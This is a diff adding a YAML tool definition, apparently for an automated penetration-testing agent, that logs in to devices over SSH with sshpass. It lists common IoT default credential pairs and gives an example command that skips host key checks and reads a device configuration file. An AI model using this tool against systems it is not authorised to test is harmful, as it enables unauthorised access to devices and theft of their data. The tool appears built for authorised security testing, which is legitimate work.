@@ -1,0 +1,19 @@
+name: "ssh_login"
+command: "bash"
+args: ["-c"]
+enabled: true
+timeout: 15
+short_description: "SSH login attempt with credentials"
+description: >
+  Attempt SSH login with credentials. Executes a command on the remote host
+  and returns the output as proof. Use to PROVE default credential vulnerabilities.
+  The command_string should be: sshpass -p PASSWORD ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -o ConnectTimeout=5 USER@HOST 'COMMAND'
+  Common IoT default creds: admin:admin, root:root, ubnt:ubnt, pi:raspberry.
+  Example: sshpass -p admin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@192.168.100.13 'id && cat /etc/iot/config.json'
+max_output: 3000
+parameters:
+  - name: "command_string"
+    type: "string"
+    description: "Full sshpass command (e.g. \"sshpass -p admin ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null admin@192.168.100.13 'id && cat /etc/iot/config.json'\")"
+    required: true
+    format: "positional"
